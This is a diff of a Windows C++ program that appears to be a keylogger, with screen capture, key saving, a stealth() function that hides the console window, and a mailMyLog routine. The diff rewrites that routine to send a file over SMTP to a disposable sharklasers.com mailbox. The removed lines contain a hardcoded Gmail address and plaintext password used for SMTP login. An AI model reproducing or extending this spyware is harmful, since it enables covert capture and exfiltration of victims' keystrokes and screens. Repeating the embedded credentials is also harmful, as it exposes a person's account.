@@ -1,9 +1,16 @@
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
+#define _WIN32_WINNT 0x501
+
 #include<bits/stdc++.h>
 #include<stdio.h>
 #include<conio.h>
 #include<graphics.h>
 #include<windows.h>
 #include <windowsx.h>
+#include <ws2tcpip.h>
+#include <iphlpapi.h>
 #include <unistd.h>
 #include<winuser.h>
 #include<string>
@@ -11,7 +18,8 @@
 #include<time.h>
 #include <cstdlib>
 
-
+#define SMTP_PORT "25"
+#define DEFAULT_BUFLEN 1024
 #define BUFSIZE 800
 #define waittime 500
 #define cmailserver "gmail-smtp-in.l.google.com"
@@ -842,188 +850,164 @@ bool ScreenCapture(int x, int y, int width, int height, char *filename)
     return value;
 }
 
-
-string Encode(string data) {
-    char sEncodingTable[] = {
-      'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
-      'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
-      'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
-      'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
-      'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
-      'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
-      'w', 'x', 'y', 'z', '0', '1', '2', '3',
-      '4', '5', '6', '7', '8', '9', '+', '/'
-    };
-
-    size_t in_len = data.size();
-    size_t out_len = 4 * ((in_len + 2) / 3);
-    std::string ret(out_len, '\0');
-    size_t i;
-    char *p = const_cast<char*>(ret.c_str());
-
-    for (i = 0; i < in_len - 2; i += 3) {
-      *p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
-      *p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int) (data[i + 1] & 0xF0) >> 4)];
-      *p++ = sEncodingTable[((data[i + 1] & 0xF) << 2) | ((int) (data[i + 2] & 0xC0) >> 6)];
-      *p++ = sEncodingTable[data[i + 2] & 0x3F];
+int sendData(SOCKET* socket, const char* data)
+{
+    int iResult;
+    printf("%s", data);
+    iResult = send(*socket, data, (int)strlen(data), 0);
+    if (iResult == SOCKET_ERROR) {
+        printf("send failed (msg: %s): %d\n", data, WSAGetLastError());
     }
-    if (i < in_len) {
-      *p++ = sEncodingTable[(data[i] >> 2) & 0x3F];
-      if (i == (in_len - 1)) {
-        *p++ = sEncodingTable[((data[i] & 0x3) << 4)];
-        *p++ = '=';
-      }
-      else {
-        *p++ = sEncodingTable[((data[i] & 0x3) << 4) | ((int) (data[i + 1] & 0xF0) >> 4)];
-        *p++ = sEncodingTable[((data[i + 1] & 0xF) << 2)];
-      }
-      *p++ = '=';
-    }
+    return iResult;
+}
 
-    return ret;
+void recvData(SOCKET* socket)
+{
+    int recvbuflen = DEFAULT_BUFLEN;
+    char recvbuf[DEFAULT_BUFLEN];
+    int iResult;
+    iResult = recv(*socket, recvbuf, recvbuflen - 1, 0);
+    printf("In recvData function: %d\n", iResult);
+    if (iResult > 0) {
+        recvbuf[iResult] = '\0';
+        printf("%s", recvbuf);
+    }
+    else if (iResult == 0)
+        printf("Connection closed\n");
+    else
+        printf("recv failed: %d\n", WSAGetLastError());
 }
 
 int mailMyLog(char *mailserver, char *emailto, char *emailfrom, char *emailsubject, char *emailmessage) {
 
-    SOCKET sockfd;
     WSADATA wsaData;
-    FILE *smtpfile;
 
-    #define bufsize 300
-    int bytes_sent;   /* Sock FD */
-    int err;
-    struct hostent *host;   /* info from gethostbyname */
-    struct sockaddr_in dest_addr;   /* Host Address */
-    char line[1000];
-    char *Rec_Buf = (char*) malloc(bufsize+1);
-    smtpfile=fopen(SMTPLog,"a+");
-    if (WSAStartup(0x202,&wsaData) == SOCKET_ERROR) {
-      fputs("WSAStartup failed",smtpfile);
-      WSACleanup();
-      return -1;
+    int iResult;
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        printf("WSAStartup failed: %d\n", iResult);
+        return 1;
     }
-    if ( (host=gethostbyname(mailserver)) == NULL) {
-       perror("gethostbyname");
-       exit(1);
+
+    struct addrinfo *result = NULL;
+    struct addrinfo *ptr = NULL;
+    struct addrinfo hints;
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    iResult = getaddrinfo("mail.sharklasers.com", SMTP_PORT, &hints, &result);
+    if (iResult != 0) {
+        printf("getaddrinfo failed: %d\n", iResult);
+        WSACleanup();
+        return 1;
     }
-    memset(&dest_addr,0,sizeof(dest_addr));
-    memcpy(&(dest_addr.sin_addr),host->h_addr,host->h_length);
 
-     /* Prepare dest_addr */
-     dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */
-     dest_addr.sin_port= htons(25); /* PORT defined above */
-
-     /* Get socket */
-
-     if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
-        perror("socket");
-        exit(1);
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
+        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+        if (ConnectSocket == INVALID_SOCKET) {
+            printf("socket failed: %ld\n", WSAGetLastError());
+            WSACleanup();
+            return 1;
         }
-     /* Connect !*/
-    //cout<< "connecting"<<endl;
-     fputs("Connecting....\n",smtpfile);
-   // int n = connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr));
-    //printf("%d\n",n);
-    if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){
-        printf("ami error khaisi\n");
-        //printf("%d\n",)
-        perror("connect");
-        exit(1);
+        printf("ekhane eshechi\n");
+
+        cout<<ConnectSocket<< " "<< ptr->ai_addr << " "<< (int)ptr->ai_addrlen<<endl;
+        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+        cout<< iResult<<endl;
+        cout<< WSAGetLastError()<<endl;
+        if (iResult == SOCKET_ERROR) {
+            closesocket(ConnectSocket);
+            printf("error detected\n");
+            ConnectSocket = INVALID_SOCKET;
+            continue;
         }
+        break;
+    }
+    freeaddrinfo(result);
 
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     strcpy(line,"EHLO me.somepalace.com\n");
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
+    if (ConnectSocket == INVALID_SOCKET) {
+        printf("Unable to connect to server!\n");
+        printf(" %ld\n", WSAGetLastError());
+        WSACleanup();
+        return 1;
+    }
 
-     char command[100];
-     strcpy(command, "AUTH LOGIN\r\n");
-     bytes_sent = send(sockfd,command,sizeof(command),0);
-     err = recv(sockfd, Rec_Buf, sizeof(Rec_Buf), 0); Rec_Buf[err]='\0';
-     fputs(Rec_Buf,smtpfile);
+    sendData(&ConnectSocket, "HELO mail.sharklasers.com\r\n");
+    recvData(&ConnectSocket);
+    sendData(&ConnectSocket, "MAIL FROM:<psgibrxp@sharklasers.com>\r\n");
+    recvData(&ConnectSocket);
+    sendData(&ConnectSocket, "RCPT TO:<psgibrxp@sharklasers.com>\r\n");
+    recvData(&ConnectSocket);
+    sendData(&ConnectSocket, "DATA\r\n");
+    recvData(&ConnectSocket);
+    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
+    sendData(&ConnectSocket, "And this is text\r\n");
+    sendData(&ConnectSocket, "MIME-Version: 1.0\r\n");
+    sendData(&ConnectSocket, "Content-Type:multipart/mixed;boundary=\"977d81ff9d852ab2a0cad646f8058349\"\r\n");
+    sendData(&ConnectSocket, "Subject:This is subject of my mail\r\n");
+    sendData(&ConnectSocket, "\r\n"); /* added */
+    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
+    sendData(&ConnectSocket, "Content-Type: text/plain; charset=\"utf-8\"\r\n");
+    sendData(&ConnectSocket, "Content-Transfer-Encoding: quoted-printable\r\n\r\n");
+    sendData(&ConnectSocket, "Hi Siam,=0A=0AThis is an empty file.=0A=0ARegards,=0A<ME>=0A=0A---- =0ASent using Guerrillamail.com =0ABlock or report abuse : https://www.guerrillamail.com//abuse/?a=3DUVJzDA8SW6Q1mwa14nUTcwfCX9ne0dhd=0A \r\n\r\n");
+    sendData(&ConnectSocket, "--977d81ff9d852ab2a0cad646f8058349\r\n");
+    sendData(&ConnectSocket, "Content-Type: text/plain\r\n");
+    sendData(&ConnectSocket, "Content-Transfer-Encoding: base64\r\n");
+    sendData(&ConnectSocket, "Content-Disposition: attachment; filename=\"test.cpp\"\r\n\r\n");
+    sendData(&ConnectSocket, "U2FtcGxlIFRleHQu");
+    sendData(&ConnectSocket, "\r\n\r\n--977d81ff9d852ab2a0cad646f8058349--\r\n\r\n");
+    sendData(&ConnectSocket, ".\r\n");
 
-     string command2 = Encode("dynamicsiam01@gmail.com");
-     for(int i=0;i<command2.size();i++)
-     {
-         command[i]=command2.at(i);
-     }
-     command[command2.size()]='\0';
-     strcat(command,"\r\n");
-     bytes_sent = send(sockfd,command,sizeof(command),0);
-     err = recv(sockfd, Rec_Buf, sizeof(Rec_Buf), 0); Rec_Buf[err]='\0';
-     fputs(Rec_Buf, smtpfile);
+    FILE* MailFilePtr = fopen("test.cpp", "r");
+    if (MailFilePtr == NULL)
+        printf("Error opening attachment\n");
 
-     command2 = Encode("siam161164");
-     for(int i=0;i<command2.size();i++)
-     {
-         command[i]=command2.at(i);
-     }
-     command[command2.size()]='\0';
-     bytes_sent = send(sockfd,command,sizeof(command),0);
-     err = recv(sockfd, Rec_Buf, sizeof(Rec_Buf), 0); Rec_Buf[err]='\0';
-     fputs(Rec_Buf, smtpfile);
+    char FileBuffer[1024];
+    char buf[1024];
 
+    memset(FileBuffer, 0, sizeof(FileBuffer));
+    while (fgets(FileBuffer, sizeof(FileBuffer), MailFilePtr))
+    {
+        sprintf(buf, "%s", FileBuffer);
+        buf[strlen(buf) - 1] = 0;
+        sendData(&ConnectSocket, buf);
+        memset(FileBuffer, 0, sizeof(FileBuffer));
+        memset(buf, 0, sizeof(buf));
+    }
 
-     strcpy(line,"MAIL FROM:<");
-     strncat(line,emailfrom,strlen(emailfrom));
-     strncat(line,">\r\n",3);
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     strcpy(line,"RCPT TO:<");
-     strncat(line,emailto,strlen(emailto));
-     strncat(line,">\r\n",3);
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     strcpy(line,"DATA\n");
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     //sleep(waittime);
-     strcpy(line,"To:");
-     strcat(line,emailto);
-     strcat(line,"\n");
-     strcat(line,"From:");
-     strcat(line,emailfrom);
-     strcat(line,"\n");
-     strcat(line,"Subject:");
-     strcat(line,emailsubject);
-     strcat(line,"\n");
-     strcat(line,emailmessage);
-     strcat(line,"\r\n.\r\n.");
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     strcpy(line,"QUIT\r\n");
-     fputs(line,smtpfile);
-     bytes_sent=send(sockfd,line,strlen(line),0);
-     //sleep(waittime);
-     err=recv(sockfd,Rec_Buf,bufsize,0);Rec_Buf[err] = '\0';
-     fputs(Rec_Buf,smtpfile);
-     fclose(smtpfile);
-     //#ifdef WIN32
-     closesocket(sockfd);
-     WSACleanup();
-     //#else
-    // close(sockfd);
-     //#endif
-     //cout<< "siam"<<endl;
+    fclose(MailFilePtr);
+
+    sendData(&ConnectSocket, "\r\n\r\n--KkK170891tpbkKk__FV_KKKkkkjjwq--\r\n\r\n");
+    sendData(&ConnectSocket, ".\r\n");
+    recvData(&ConnectSocket);
+
+    sendData(&ConnectSocket, "QUIT\r\n");
+
+    iResult = shutdown(ConnectSocket, SD_SEND);
+    if (iResult == SOCKET_ERROR) {
+        printf("shutdown failed: %d\n", WSAGetLastError());
+        closesocket(ConnectSocket);
+        WSACleanup();
+        return 1;
+    }
+
+    closesocket(ConnectSocket);
+    WSACleanup();
+    return 0;
 }
 
+void stealth()
+{
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth,0);
+
+}
 
 int save(int _key, char const *file)
 {
@@ -1067,14 +1051,6 @@ int save(int _key, char const *file)
     return 0;
 }
 
-void stealth()
-{
-    HWND stealth;
-    AllocConsole();
-    stealth = FindWindowA("ConsoleWindowClass", NULL);
-    ShowWindow(stealth,0);
-
-}
 
 int main()
 {
